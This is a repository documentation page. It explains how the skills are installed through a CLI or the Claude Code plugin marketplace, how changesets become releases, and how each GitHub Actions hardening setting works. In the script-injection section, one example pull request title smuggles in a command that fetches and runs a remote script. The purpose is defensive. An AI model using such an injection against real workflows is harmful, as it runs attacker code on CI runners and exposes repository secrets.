# How it works

This page explains three things in plain language:

1. How the two install paths differ.
2. How a changeset turns into a version and a release.
3. What each safety setting in the GitHub Actions does, and why.

---

## 1. Two ways to install

Both paths read the same `skills/<group>/<name>/SKILL.md` folders. They
differ in who does the work and what you get.

### `npx skills add mckayqsnell/snell-skills`

- **What it is.** `skills` is a command-line tool (a CLI) from Vercel.
  `npx` downloads it and runs it once, without installing it for good.
- **What it does.** It clones the repo, looks for `SKILL.md` files, asks
  which skills and which agents you want, then copies (or links) each skill
  folder into that agent's skills folder. For Claude Code that is
  `.claude/skills/`. For Codex it is a different folder, and so on.
- **How it finds nested groups.** It walks `skills/` up to three levels
  deep, so `skills/tools/to-markdown/` is found. It also reads the
  `"skills"` list in `.claude-plugin/plugin.json`.
- **What you get.** Skills only. Plugins can also carry commands and
  hooks, which are a Claude Code idea; this path would skip them. (This
  repo has none today.)
- **Updates.** None by themselves. You run the command again.
- **Works with.** Claude Code, Codex, Cursor, OpenCode and about 75 other
  agents.

### Claude Code plugin marketplace

- **Words first.** A **plugin** is a bundle of skills, commands and hooks
  that Claude Code installs as one unit. A **marketplace** is a catalog file
  (`.claude-plugin/marketplace.json`) that lists plugins and where to get
  them. This repo is both: the catalog lists one plugin, and its `source` is
  `./`, the repo itself.
- **What it does.** `claude plugin marketplace add mckayqsnell/snell-skills`
  clones the repo and reads the catalog. `claude plugin install
  snell-skills@snell-skills` copies the plugin into Claude Code's plugin
  cache (`~/.claude/plugins/`) and turns it on. The part before `@` is the
  plugin's name; the part after is the marketplace's name.
- **How it finds nested groups.** By default a plugin only scans
  `skills/<name>/SKILL.md`, one level. `plugin.json` adds
  `"skills": ["./skills/tools/"]`, which tells it to scan that group
  folder too. A new group needs a new line there.
- **What you get.** Every skill, plus any commands or hooks the plugin
  ships (none today). Names get a prefix: `/snell-skills:to-markdown`.
- **Updates.** Claude Code compares the `version` in `plugin.json` with the
  one you have. You get a new copy only when that string changes. That is
  why the release flow (next section) bumps it on every release. Automatic
  updates are **off by default** for non-Anthropic marketplaces: each user
  turns them on once under `/plugin` → Marketplaces → Enable auto-update.
  Otherwise they run `claude plugin update snell-skills@snell-skills`.
- **Works with.** Claude Code only.

### Private repo, both paths

Neither tool has a password of its own. Both run `git` on your machine and
use whatever access git already has: an SSH key loaded in `ssh-agent`, or a
stored HTTPS login (`gh auth login`, then `gh auth setup-git`). While this
repo is private, only people with read access can install it.

### Personal paths: `local.env`

No skill here needs a per-machine path today. When one does, the rule is:
put the value in a `local.env` file that git ignores, commit a
`local.env.example` that explains each key, and make the skill's script stop
with a clear message when the file or key is missing. Never write a path
like `/Users/<you>/...` into a skill. CI's scrub check fails if one sneaks in.

---

## 2. From a changeset to a release

**Words first.**

- A **changeset** is a small Markdown file in `.changeset/`. It names the
  bump (major, minor or patch) and has a one-line note for the changelog.
  You make one with `pnpm changeset`.
- **Semver** (semantic versioning) is the `MAJOR.MINOR.PATCH` number
  scheme. CONTRIBUTING.md says when to bump which part.
- A **tag** is a name git pins to one commit, like `v1.0.0`.
- A **GitHub release** is a page on GitHub tied to a tag, with notes.

**Where the version lives.** `package.json` holds the real version. It is
marked `"private": true`, so it is never published to npm. It exists only
so the changesets tool has something to bump. Changesets skips private
packages unless told otherwise, so `.changeset/config.json` sets
`privatePackages.version` and `privatePackages.tag` to `true`.

**The flow, step by step.**

1. You change a skill and run `pnpm changeset`. You pick `minor` and write
   "Add the X skill". This makes a file like `.changeset/brave-cats-sing.md`.
   You commit it with your change and open a pull request.
2. CI runs the checks. You merge the pull request into `main`.
3. The push to `main` starts the **Release** workflow. It runs
   `changesets/action`, which sees a pending changeset. So it runs
   `pnpm run version-packages`:
   - `changeset version` reads every changeset, bumps `package.json`
     (say `1.0.0` → `1.1.0`), writes the notes into `CHANGELOG.md`, and
     deletes the changeset files.
   - `scripts/sync-version.mjs` copies `1.1.0` into
     `.claude-plugin/plugin.json`, the version Claude Code reads.
4. The action commits that on a branch and opens a pull request called
   **Version Packages**. If you merge more changes with changesets first,
   it updates the same pull request. Nothing is released yet.
5. You merge **Version Packages** when you're ready to release.
6. That push to `main` starts the Release workflow again. Now there are no
   pending changesets, so the action runs `pnpm run release` instead. That
   is `changeset git-tag`, which creates the tag `v1.1.0` (it skips
   versions that already have a tag). The action pushes the tag and
   creates a GitHub release with the changelog notes.
7. Plugin users now get the update, because the `version` in `plugin.json`
   changed.

**One repo setting is needed.** GitHub blocks workflows from opening pull
requests unless you allow it. It's under Settings → Actions → General →
"Allow GitHub Actions to create and approve pull requests". Until it is on,
step 4 fails.

---

## 3. The Actions safety settings

A GitHub Actions **workflow** is a YAML file in `.github/workflows/` that
GitHub runs on its own machines (called **runners**) when something happens,
such as a push. A **job** is one group of steps on one runner. Each setting
below closes a known way that workflows get abused.

### Pin every action to a full commit SHA

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

- **What it is.** An action is someone else's code your workflow runs. A
  tag like `v7` is a movable label; the owner (or someone who steals their
  account) can point it at new code any time. A **commit SHA** is a
  fingerprint of one exact version. It can't be moved.
- **Guards against.** A supply-chain attack: a popular action gets
  hijacked and its tag is moved to code that steals secrets. This has
  happened (tj-actions/changed-files, March 2025).
- **Why the comment.** `# v7.0.1` tells humans, and Dependabot, which
  release the SHA is.

### `permissions:` at the minimum, per job

```yaml
permissions:
  contents: read     # top level: the default for every job
jobs:
  release:
    permissions:
      contents: write
      pull-requests: write
```

- **What it is.** Each run gets a temporary token (`GITHUB_TOKEN`) that can
  act on the repo. `permissions:` decides what that token may do.
- **Guards against.** Damage from any step that goes wrong. If a tool in
  the CI job were compromised, its token can only read code, not push or
  release.
- **Why per job.** Only the release job can write, and only the two things
  it needs.

### `persist-credentials: false` on checkout

- **What it is.** By default `actions/checkout` leaves the token saved in
  the repo's git config, so later steps can `git push`.
- **Guards against.** A later step (or a dependency's install script)
  reading that saved token and using it. It also keeps the token out of
  anything that gets uploaded.
- **Why it still works here.** CI never pushes. The release job lets
  `changesets/action` push through the GitHub API with its own token
  instead of git.

### Concurrency groups

```yaml
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false
```

- **What it is.** Runs in the same group wait for each other (or cancel the
  older one).
- **Guards against.** Two releases racing: both bump the version or tag
  at the same time and leave a mess. Release runs queue and never cancel
  halfway. CI runs on the same pull request cancel the stale one, which
  saves time.

### `timeout-minutes`

- **Guards against.** A stuck step running for hours. GitHub's default
  limit is six hours. Ours is ten minutes.

### `set -euo pipefail` in every `run:` step

- `-e`: stop at the first command that fails.
- `-u`: treat an unset variable as an error, instead of an empty string.
- `-o pipefail`: in `a | b`, fail if `a` fails, not only `b`.
- **Guards against.** A step that fails halfway but still shows green,
  so a broken check passes.

### Untrusted input goes through `env:`, never straight into a script

- **What it is.** Text like a pull request title or branch name comes from
  whoever opened the pull request. Writing
  `${{ github.event.pull_request.title }}` inside a `run:` script pastes
  that text into the script before it runs.
- **Guards against.** **Script injection.** A title like
  `"; curl evil.sh | sh; "` would run as code. Passing values as `env:`
  variables keeps them as plain data. Our workflows don't use such inputs
  at all; the only `${{ }}` values are in `concurrency:` names, where they
  are not run as code.

### Checksum-verified tools

- The CI downloads `actionlint` and checks its sha256 fingerprint against
  the one from the release before running it. If the download were
  swapped, the check fails.

### No dependency cache in the release job

- **Guards against.** **Cache poisoning.** A cache can be written by one
  run and read by another. A poisoned cache in a job that can write to the
  repo is dangerous. CI caches the pnpm store to run faster; the release
  job does not.

### Dependabot with a cooldown

- **What it is.** Dependabot opens pull requests when a pinned action or
  dev dependency has a new release, updating both the SHA and the comment.
- **Why the cooldown.** It waits seven days after a release before
  proposing it. Hijacked releases are usually caught and pulled within
  days.
- **The same rule for installs.** `pnpm-workspace.yaml` sets
  `minimumReleaseAge: 10080` (7 days, in minutes). pnpm refuses to install
  any package version younger than that, even one already in the lockfile.
  So CI fails on a too-new version instead of running it.

### The linters that check all this

- **actionlint** checks workflow files for mistakes: bad syntax, wrong
  inputs, shell errors in `run:` steps.
- **zizmor** checks them for security problems: unpinned actions, broad
  permissions, saved credentials, injection risks, cache poisoning.
- **shellcheck** checks every `.sh` file for common shell bugs.
